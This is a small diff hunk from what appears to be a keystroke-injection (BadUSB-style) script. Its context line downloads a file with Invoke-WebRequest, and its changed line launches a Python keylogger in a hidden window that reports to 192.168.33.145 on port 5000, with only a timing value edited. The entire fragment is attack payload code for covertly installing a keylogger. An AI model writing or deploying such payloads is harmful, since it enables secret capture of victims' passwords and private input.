@@ -23,7 +23,7 @@ STRING Invoke-WebRequest https://raw.githubusercontent.com/berjc/ysip-ms/master/
 ENTER
 DELAY 1000
 
-STRING Start-Process -WindowStyle hidden python -ArgumentList 'win-key-logger.py','30','192.168.33.145','5000'
+STRING Start-Process -WindowStyle hidden python -ArgumentList 'win-key-logger.py','60','192.168.33.145','5000'
 ENTER
 DELAY 1000
 
